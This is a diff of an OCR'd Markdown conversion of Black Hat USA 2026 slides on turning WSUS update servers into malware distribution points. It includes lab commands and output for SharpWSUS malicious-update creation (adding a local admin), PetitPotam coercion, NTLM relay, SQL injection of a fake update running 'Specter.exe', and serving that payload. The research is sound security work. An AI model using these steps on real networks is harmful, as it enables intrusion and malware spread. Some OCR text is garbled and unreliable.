@@ -1,5 +1,5 @@
 ---
-title: "Turning Enterprise Update Servers Into Backdoor Factories (0 o)"
+title: "Turning Enterprise Update Servers Into Backdoor Factories (0_o)"
 speakers: ["bagelByt3s"]
 conference: "Black Hat"
 conference_full: "Black Hat USA 2026"
@@ -8,19 +8,24 @@ year: 2026
 source_pdf: "BlackHat_USA_2026_Slides/bagelByt3s_Turning Enterprise Update Servers Into Backdoor Factories (0_o).pdf"
 pages: 77
 sha256: "3371c0035cd4317ee589b5665b6a1b38ea55aba34e86906e5d3ecff2929219b7"
-text_chars: 43428
-ocr_pages: 61
+text_chars: 39827
+ocr_pages: 57
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 90.0
+ocr_unreliable_blocks: 4
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T23:19:17Z"
+converted_at: "2026-08-12T05:50:17Z"
 ---
-# Turning Enterprise Update Servers Into Backdoor Factories (0 o)
+# Turning Enterprise Update Servers Into Backdoor Factories (0_o)
 
 **Speakers:** bagelByt3s  
 **Conference:** Black Hat USA 2026  
 **Source:** `BlackHat_USA_2026_Slides/bagelByt3s_Turning Enterprise Update Servers Into Backdoor Factories (0_o).pdf` (77 pages)
+
 
 ## Slide 1
 
@@ -29,17 +34,6 @@ Turning Enterprise Update Servers Into Backdoor Factories (0_o)
 Beyviel David
 
 Beyviel David Adversary Simulation Consultant
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-mtF hat SPECTERUPS
-USA 2026
-Turning Enterprise Update Servers
-Into Backdoor Factories (0_0)
-Beyviel David
-Adversary Simulation Consultant Nn
-```
 
 ## Slide 2
 
@@ -77,7 +71,8 @@ Infrastructure
 
 4
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Introduction
@@ -89,7 +84,6 @@ Ne | unsigned_shOrt Nov 15th, 2024 at 3:28 AM
 advantage of it
 | believe we could do things like create and approve malicious updates or modify
 update metadata
-USA 2026
 ```
 
 ## Slide 5
@@ -98,10 +92,11 @@ USA 2026
 
 5
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Windows Server  Getstarted Learn Windows Server Troubleshooting Previous versions documentation Resources Vv
+Windows Server Getstarted Learn Windows Server Troubleshooting Previous versions documentation Resources Vv
 =2 Find by title
 Management
 > Overview
@@ -151,7 +146,8 @@ must be able to connect to Microsoft Update to get available update information.
 
 6
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Learn / Windows Server / Administration / | fo Ask Learn | 60 Focus mode
@@ -167,8 +163,6 @@ deploy and maintain WSUS.
 WSUS is deprecated and is no longer adding new features. However, it continues to be supported for production
 deployments, and receives security and quality updates as per the product lifecycle. For more info, see Features
 removed or no longer developed in Windows Server.
-piseichat
-USA 2026
 ```
 
 ## Slide 7
@@ -177,7 +171,8 @@ USA 2026
 
 7
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Windows Server Update Services (WSUS)
@@ -185,8 +180,6 @@ overview
 Windows Server Update Services (WSUS) provides a way for IT administrators to deploy the latest Microsoft product
 updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to
 computers on your network. This article provides an overview of this server role and more information about how to
-piseichat
-USA 2026
 ```
 
 ## Slide 8
@@ -197,13 +190,13 @@ USA 2026
 
 8
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ¢ WSUS Client
 ° Configured via Registry or GPO
 ° Initiates Update to W SUS Server
-USA 2026
 ```
 
 ## Slide 9
@@ -229,12 +222,12 @@ USA 2026
 
 10
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 73/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 — ¢ WSUS Database
 a | ¢ Stores Update Metadata
-—_—__
 a | * Windows Internal Database (W ID)
 ae e External SQL Server
 10
@@ -256,15 +249,6 @@ Downstream
 
 13
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-USA 2026
-Upstream
-Downstream
-13
-```
-
 ## Slide 14
 
 Client
@@ -277,12 +261,12 @@ Downstream
 
 14
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Client Upstream
 Client Downstream
-USA 2026
 14
 ```
 
@@ -302,21 +286,6 @@ Database
 
 15
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-piseichat
-USA 2026
-Client
-Client
-Upstream
-Downstream
-Database
-ccd
-Database
-IS
-```
-
 ## Slide 16
 
 Client
@@ -333,13 +302,12 @@ Database
 
 16
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Client Upstream
 Client Downstream
-piseichat
-USA 2026
 Database
 Database
 16
@@ -351,14 +319,12 @@ Database
 
 17
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 SharpWSUS
-26 github.com/nettitude/SharpWSUS
-"ANAS AV_\I
 I.) \v v/s __) |
-|_
 Phil Keeble @ Nettitude Red Team
 Commands listed below have optional parameters in <>.
 Locate the WSUS server:
@@ -373,8 +339,6 @@ Check status of an update:
 SharpWSUS.exe check /updateid:[UpdateGUID] /computername: [Target FQDN]
 Delete update and clean up groups added:
 SharpWSUS.exe delete /updateid:[UpdateGUID] /computername:[Target FQDN] </groupname:[GroupName] /ke
-piseichat
-USA 2026
 ```
 
 ## Slide 18
@@ -383,12 +347,11 @@ USA 2026
 
 18
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 SharpWSUS
-piseichat
-USA 2026
 Lateral Movement
 A key consideration with WSUS lateral movement is that there is no way to control when a client checks
 in from the server. This means that once a patch is deployed the lateral movement won’t succeed until
@@ -416,7 +379,8 @@ localgroup administrators WSUSDemo /add\"" /title: "WSUSDemo"
 
 19
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 SharpWSUS, allowing the operator to change the Indicators of Compromise (loCs) of the patch. There is
@@ -452,11 +416,10 @@ Does the upstream W SUS server have administrative permissions over the downstre
 
 21
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-piseichat
-USA 2026
 Does the upstream W SUS server have
 administrative permissions over the
 downstream W SUS server?
@@ -475,7 +438,8 @@ Attacker
 
 22
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 NTLM Coercion Testing
@@ -483,7 +447,6 @@ SMB to SMB
 Ee |
 Upstream Downstream
 Attacker
-USA 2026
 22
 ```
 
@@ -513,7 +476,8 @@ Downstream W SUS Server
 
 24
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 NTLM Coercion Testing
@@ -533,7 +497,6 @@ Impacket v@.13.0 - Copyright Fortra, LLC and vee companies
 [*] Protocol Client RPC loaded. .
 [*] Protocol Client DCSYNC loaded. .
 Downstream W SUS Server
-USA 2026
 ```
 
 ## Slide 25
@@ -547,18 +510,15 @@ Server
 
 25
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 NTLM Coercion Testing
 SMB to SMB
 (env) root@Ludus3:/opt/PetitPotam# python3 PetitPotam.py -u domainuser -p password -d Ludus.nuketown 198.51.100.1 10.2.10.3
-~
 - rl Attacker IP /
-t*\
--l-l- \,-I| I-I_I-1
 Upstream W SUS
-"\_9-9- 19-9 gti 0-9-'"'-9-9-' "9-9-1" -9-9-'"'-9-9-!"'-9- Q-'"\_9-9-' Server
 PoC to elicit machine account authentication via some MS-EFSRPC functions
 by topotam (@topotam77)
 Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
@@ -570,9 +530,6 @@ Trying pipe lsarpc
 [-] Sending EfsRpcOpenFileRaw!
 [+] Got expected ERROR_BAD_NETPATH exception! !
 [+] Attack worked!
-pistichat
-USA 2026
-25)
 ```
 
 ## Slide 26
@@ -581,7 +538,8 @@ NTLM Coercion Testing SMB to SMB
 
 26
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 NTLM Coercion Testing
@@ -594,7 +552,6 @@ ntlmrelayx> [*] (SMB): Received connection from 10.2.10.3, attacking target smb:
 socks
 Protocol Target Username AdminStatus} Port ID
 SMB 10.2.10.4 LUDUS/WSUS1$ |_FALSE 4u5 1
-USA 2026
 26
 ```
 
@@ -604,11 +561,11 @@ Does the upstream W SUS server have SQL access to the W SUS database?
 
 **27**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 blackhat
-USA 2026
 Does the upstream W SUS server have SQL access
 to the W SUS database?
 27
@@ -626,20 +583,15 @@ Attacker
 
 28
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 NTLM Coercion Testing
 SMB to SMB
-=
 Upstream
-<==
-=
-—
-ae
 Database
 Attacker
-USA 2026
 28
 ```
 
@@ -655,20 +607,15 @@ Attacker
 
 29
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 NTLM Coercion Testing
 SMB to SMB
-=
 Upstream
-<==
-=
-—
-ae
 Database
 Attacker
-USA 2026
 29
 ```
 
@@ -698,7 +645,8 @@ NTLM Coercion Testing SMB to MSSQL
 
 31
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 NTLM Coercion Testing
@@ -712,7 +660,6 @@ SMB to MSSQL
 socks
 Protocol Target Username AdminStatus} Port ID
 MSSQL 10.2.10.2 LUDUS/WSUS1$ [N/A 1433 1
-USA 2026
 Bi
 ```
 
@@ -728,14 +675,14 @@ Bi
 
 32
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Exploitation Difficulty
 ¢ WSUS Administrator
 * WSUS File System Access
 * Digitally Signature
-USA 2026
 3322
 ```
 
@@ -745,14 +692,14 @@ USA 2026
 
 33
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 NTLM Coercion Testing
 SMB to MSSQL
 SQL CLUDUS\WSUS1$ gquest@master)> SELECT name from sys.databases;
 name
-USA 2026
 ```
 
 ## Slide 34
@@ -761,7 +708,8 @@ USA 2026
 
 **34**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Blocker: Limited SQL Permissiorg
@@ -773,8 +721,6 @@ SQL (LUDUS\WSUS1$ LUDUS\WSUS1$@SUSDB)> SELECT TOP 1 * FROM susdb.dbo.tbFile
 ERROR(SQL1-WSUS): Line 1:/ The SELECT permission was denied] on the object 'tbFile', database 'S
 Chris Thompson
 Mayyhem
-pistkhat 34
-USA 2026
 ```
 
 ## Slide 35
@@ -783,20 +729,16 @@ USA 2026
 
 35
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Blocker: Limited SQL Permissions
 PUBLIC@SUSDB
-@ ) LUDUS\Wsus1$
-MSSQL_IsMappedTo MSSQL_MemberOf Ge) ne
 MSSQL_MemberOf
 © LUDUS\WSUS1$@SUSDB
-®
 MSSQL_Contains
 MSSQL_Connect
-piseichat
-USA 2026
 35
 ```
 
@@ -816,11 +758,10 @@ The webService role is limited to specific stored procedures
 
 37
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-piseichat
-USA 2026
 The webService role is limited to specific stored
 procedures
 37
@@ -832,7 +773,8 @@ procedures
 
 38
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Running Stored Procedures
@@ -844,8 +786,6 @@ One or more SQL statements precompiled into a single executable procedure.
 e Extended stored procedures:
 C or C++ dynamic-link libraries (DLL) written to the SQL Server Open Data Services API
 for extended stored procedures. The Open Data Services API extends the capabilities of
-piseichat 38
-USA 2026
 ```
 
 ## Slide 39
@@ -854,12 +794,11 @@ USA 2026
 
 39
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 One or more SQL statements precompiled into a single executable procedure.
-piseichat
-USA 2026
 ```
 
 ## Slide 40
@@ -872,14 +811,13 @@ Database
 
 40
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Stored Procedures
 Bim
-Bi
 WSUS Server
-USA 2026
 Database
 40
 ```
@@ -896,19 +834,6 @@ Database
 
 41
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Stored Procedures
-a
-splmportU pdate
-W SUS Server
-Se
-piSeichat
-Database
-41
-```
-
 ## Slide 42
 
 ## spImportUpdate
@@ -917,13 +842,12 @@ Database
 
 42
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-+)
 splmportUpdate
 blackhat
-USA 2026
 Imports new update into the W SUS
 database
 42
@@ -937,16 +861,14 @@ Imports new update into the W SUS database
 
 43
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 splmportUpdate
-piseichat
-USA 2026
 SQL (LUDUS\WSUS1$ LUDUS\WSUS1$@SUSDB)> declare @iImported int declare @iLocalRevi
 int exec spImportUpdate @UpdateXm1=N ]
 @UpstreamServerLocalID=1,@Imported=@i
-Imported output ,@localRevisionID=@iLocalRevisionID output ,@UpdatexXmlCompressed=NULL; sele
 ct @iImported,@iLocalRevisionID
 INFO(SQL1-WSUS): Line 1792: Update A7751C4D-EAB5-45EF-8CD7-2FAE2FEA1252\1 is successfull
 y added into the database
@@ -957,20 +879,19 @@ y added into the database
 
 44
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 SQL (LUDUS\WSUS1$ LUDUS\WSUS1$@SUSDB)> declare @iImported int declare @iLocalRevisionID
 int exec spImportUpdate @UpdateXml=N'<upd:Update xmlns:b="http://schemas.microsoft.com/ms
 us/2002/12/LogicalApplicabilityRules" xmlns:pub="http://schemas.microsoft.com/msus/2002/1
 2/Publishing" xmlns:cbs="http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/Cbs" xm
-Ins: cbsar="http://schemas.microsoft.com/msus/2002/12/CbsApplicabilityRules" xmlns:upd="ht
 tp://schemas.microsoft.com/msus/2002/12/Update"><upd:UpdateIdentity UpdateID="a7751c4d-ea
 b5-45ef-8cd7-2fae2feal252" RevisionNumber="1" /><upd:Properties DefaultPropertiesLanguage
 ="en" UpdateType="Software" ExplicitlyDeployable="true" Handler="http://schemas.microsof
 t.com/msus/2002/12/UpdateHandlers/Cbs" MaxDownloadSize="2095616" MinDownloadSize="209561
 6" PublicationState="Published" CreationDate="2025-08-31T00:03:55.912Z" PublisherID="3953
-92aQ-19c0-48b7 -a927-f7cC15066d905"><upd: InstallationBehavior RebootBehavior="CanRequestReb
 oot" /><upd:UninstallationBehavior RebootBehavior="CanRequestReboot" /></upd:Properties><
 upd: LocalizedPropertiesCollection><upd:LocalizedProperties><upd: Language>en</upd: Language
 ><upd: Title>Specter</upd: Title></upd:LocalizedProperties></upd:LocalizedPropertiesCollect
@@ -978,8 +899,6 @@ ion><upd:ApplicabilityRules><upd:IsInstalled><b:False /></upd:IsInstalled><upd:I
 ble><b:True /></upd:IsInstallable></upd:ApplicabilityRules><upd:Files><upd:File Digest="y
 2/wvtpOW/1SgnhTjJoi3xE1EGM=" DigestAlgorithm="SHA1" FileName="Specter.exe" Size="209561
 6" Modified="2025-08-31T15:26:20.723"><upd:AdditionalDigest Algorithm="SHA256">g1M2EFXHDs
-piseichat
-USA 2026
 ```
 
 ## Slide 45
@@ -990,26 +909,21 @@ USA 2026
 
 46
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-"
 oot" /><upd:UninstallationBehavior RebootBehavior="CanRequestReboot" /></upd:Properties><
 upd: LocalizedPropertiesCollection><upd:LocalizedProperties><upd: Language>en</upd: Language
-><upd: Title>Specter</upd:Title></upd:LocalizedProperties></upd:LocalizedPropertiesCollect
 ion><upd:ApplicabilityRules><upd:IsInstalled><b:False /></upd:IsInstalled><upd:IsInstalla
 ble><b:True /></upd:IsInstallable></upd:ApplicabilityRules><upd:Files><upd:File Digest="y
 2/wvtpOW/1SgnhTjjJoi3xELEGM=" DigestAlgorithm="SHA1" FileName="Specter.exe" Size="209561
 6" Modified="2025-08-31T15:26:20.723"><upd:AdditionalDigest Algorithm="SHA256">g1M2EFXHDs
-YV5qgPqWZW+HbgEjHLILZEwA2I1bh/ lhNpo=</upd:AdditionalDigest></upd:File></upd:Files><upd:Hand
 lerSpecificData xsi:type="cmd: CommandLineInstallation" xmlns:xsi="http://www.w3.org/200e
 1/XMLSchema-instance" xmlns:pub="http://schemas.microsoft.com/msus/2002/12/Publishing"><c
 md:InstallCommand Arguments= Program="Specter.exe" RebootByDefault="false" DefaultResul
 t="Succeeded" xmlns:cmd="http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/Command
 LineInstallation"><cmd:ReturnCode Reboot="false" Result="Succeeded" Code="@" /></cmd:Inst
-allCommand></upd:HandlerSpecificData></upd:Update>' ,@UpstreamServerLocalID=1, @Imported=@i
-Imported output ,@localRevisionID=@iLocalRevisionID output ,@UpdateXmlCompressed=NULL; sele
-ct @iImported,@iLocalRevisionID
 INFO(SQL1-WSUS): Line 1792: Update A7751C4D-EAB5-45EF-8CD7-2FAE2FEA1252\1 is successfull
 y added into the database
 ```
@@ -1040,11 +954,11 @@ Target Computer
 
 49
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Blocker: Trouble Downloading
-USA 2026
 # python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.2.10.3 - - [20/Dec/2025 15:08:09] "HEAD /Specter.exe HTTP/1.1" 200 -
@@ -1052,7 +966,6 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 Exception occurred during processing of request from ('10.2.10.3', 51944)
 Traceback (most recent call last):
 File "/usr/lib/python3.11/socketserver.py", Line 691, in process_request_thread
-self. finish request(request, client_address)
 49
 ```
 
@@ -1062,7 +975,8 @@ self. finish request(request, client_address)
 
 50
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Blocker: Trouble Downloading
@@ -1075,8 +989,6 @@ puters needing this update Release date: Saturday, August 30, 2025
 Computers installed/not applicable KB article numbers: 5006103
 © Computers with no status: 3
 2 2?
-piseichat
-USA 2026
 50
 ```
 
@@ -1086,7 +998,8 @@ Blocker: Trouble Downloading
 
 51
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 SoftwareDistribution - Notepad
@@ -1128,19 +1041,16 @@ at System. Threading. ThreadHelper.ThreadStart()
 recieved Failure for Item: e1e609f1-436e-4fba-a9d@-3291eb717ecd, Item fails
 2025-12-28 20:08:34.098 UTC Info WsusService.5@ ContentSyncAgent.ContentSyncSPFireStateMachineEvent
 KontentSyncAgent firing Event: FileDownloadFailed for Item: e1e609f1-436e-4fba-a9d@-3291eb717ecd
-2AIS-17-7A IA-AR-32A AQAA ITC Tnfao WencSanvirea SA Evantl naEvantRonortean RanoartEvant
-piseichat
-USA 2026
 ```
 
 ## Slide 52
 
 52
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-42044 -12f7-40 4AM .0O. 1. ees OT atliw MoM VIE. ae JUSLVETILMI Save LEE! .Waa ve Le igiig ee) Mihir Rr PP tr Recdlar f okk
 DispatchManager Worker Thread Processing NotificationEvent: ContentSyncAgent
 2025-12-20 20:08:13.949 UTC Info WsusService.5@ ThreadEntry ThreadHelper. ThreadStart
 2025-12-26 26:08:13.949 UTC Info WsusService.5@ SusEventDispatcher.RegisterEventHandler RegisterEventHandler called
@@ -1163,7 +1073,6 @@ http://198.51.100.1:8006/Specter.exe failed in download: (-2145386477) The serve
 protocol. Background Intelligent Transfer Service (BITS) requires that the server support the Range protocol header.
 at Microsoft.UpdateServices.ServerSync.ContentSyncAgent.JobError(IBitsJob job, BitsJobError joberror, String
 fileRemoteName)
-at Microsoft. UpdateServices. ServerSync. ContentSyncAgent.MonitorStatusThreadProc( )
 at System. Threading. ExecutionContext.RunInternal(ExecutionContext executionContext, ContextCallback callback, Object state,
 Boolean preserveSyncCtx)
 at System. Threading. ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state, Boolean
@@ -1177,13 +1086,12 @@ at System. Threading. ThreadHelper. ThreadStart()
 
 53
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 http: //198.51.100.1:8000/Specter.exe failed in download: (-2145386477) The server does not support the necessary HTTP
 protocol. Background Intelligent Transfer Service (BITS) requires that the server support the Range protocol header.
-piseichat
-USA 2026
 ```
 
 ## Slide 54
@@ -1192,7 +1100,8 @@ USA 2026
 
 54
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Blocker: Trouble Downloading
@@ -1213,7 +1122,6 @@ Press Ctrl+C to stop the server
 [10.2.10.3] |"GET /Specter.exe HTTP/1.1" 206 -
 [10.2.10.3] |"GET /Specter.exe HTTP/1.1" 206 -
 [10.2.10.3] ["GET /Specter.exe HTTP/1.1" 206 -
-USA 2026
 ```
 
 ## Slide 55
@@ -1236,7 +1144,8 @@ USA 2026
 
 56
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Blocker: Trouble Downloading
@@ -1251,8 +1160,6 @@ KB article numbers: 5006103
 B® Computers with no status:
 Description
 Install this update to resolve issues in Windows.
-piseichat
-USA 2026
 56
 ```
 
@@ -1262,7 +1169,8 @@ Bypassing Signature Verification **Bypassing Signature Verification**
 
 57
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Lateral Movement
@@ -1281,9 +1189,6 @@ such as PsExec.exe to run a command as SYSTEM, RunDLL32.exe to run a malicious D
 share, MsBuild.exe to grab and execute a remote payload and more. The example in this blog will use PsExec.exe for
 code execution (https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
 A patch leveraging PsExec.exe can be done with the following command:
-piseichat
-USA 2026
-of
 ```
 
 ## Slide 58
@@ -1292,7 +1197,8 @@ Bypassing Signature V erification Bypassing Signature V erification
 
 58
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Bypassing Signature Verification
@@ -1300,8 +1206,6 @@ Bypassing Signature Verification
 2025-12-20 20:29:13.464 UTC Info WsusService. 34
 ContentSyncAgent.ContentSyncSPFireStateMachineEvent ContentSyncAgent| firing Event:
 FileVerificationFailed for Item: e1e609f1-436e-4fba-a9d@-3291eb717ecd
-piseichat
-USA 2026
 58
 ```
 
@@ -1311,13 +1215,13 @@ Bypassing Signature V erification Bypassing Signature V erification
 
 59
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Bypassing Signature Verification
 Bypassing Signature Verification
 This PC » Windows 10 (C:) Program Files >» Update Services
-yvame
 en-US
 Microsoft.UpdateServices.CatalogSyncAgent.dll
 Microsoft.UpdateServices.ContentSyncAgent.dll
@@ -1326,26 +1230,21 @@ Microsoft.Windows.BITS.dll
 WSusCertServer
 WsusService
 WsusService.exe.config
-piseichat
-USA 2026
 Services
-38)
 ```
 
 ## Slide 60
 
 60
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 74/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-piseichat
-USA 2026
 GF dnSpy v6.1.8 (64-bit, NET)
 File Edit View
 Debug Window Help @ © i! C# >|| ‘2
 4 4$ ContentSyncAgent @02000005
->
 Base Type and Interfaces
 Derived Types
 .cctorQ) : void @06000030
@@ -1364,7 +1263,6 @@ ExecuteSPGetNextContentSyncWorkltemOnStartup(byte[]) : FileNeededByC
 ExecuteSPNotifyContentSyncNotificationEventWorking() : void @06000021
 GetUNCFilePath(string) : string @06000013
 GetUpdatesForFile(Guid) : UpdatelnformationForFile @06000023
-lobErrorflBitcloh RitclobError ctring): void M@NSNNNN17
 60
 ```
 
@@ -1372,14 +1270,12 @@ lobErrorflBitcloh RitclobError ctring): void M@NSNNNN17
 
 61
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 71/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-piseichat
-USA 2026
 GF dnSpy v6.1.8 (64-bit, NET)
